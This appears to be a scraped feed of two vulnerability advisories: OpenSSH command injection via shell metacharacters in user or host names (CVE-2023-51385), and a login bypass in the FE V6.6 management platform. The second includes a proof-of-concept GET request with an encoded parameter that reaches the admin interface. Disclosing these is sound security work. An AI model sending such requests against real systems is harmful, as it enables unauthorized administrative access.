item.title: CVE-2023-51385
item.description: Description Vulnerability Description In ssh in OpenSSH before 9.6, OS command injection might occur if a user name or host name has shell metacharacters, and this name is referenced by an expansion token in certain situations. For example, an untrusted Git repository can have a submodule with shell metacharacters in a user name or host name Affected Version OpenSSH version < 9.6 Details Vulnerability Reproduction Write these code in ~/.ssh/config

item.title: CVE-FE66-2023-003
item.description: Description Vulnerability Description Feiqi Interconnect - FE Corporate Operations Management Platform is a cloud workstation based on technologies such as cloud computing, intelligence, big data, the Internet of Things, and mobile internet. The FE Corporate Operations Management Platform V6.6 can bypass login authentication and enter the administrator interface. Affected Version FE V6.6 Details Vulnerability Reproduction POC GET /2.ln?SYS_LINK=77507068764957484a5067777862714f457a66574871642f4330574c76717868394a35496d37416c497951724f33446f51486375685a5a2b31684938472b7056 HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.
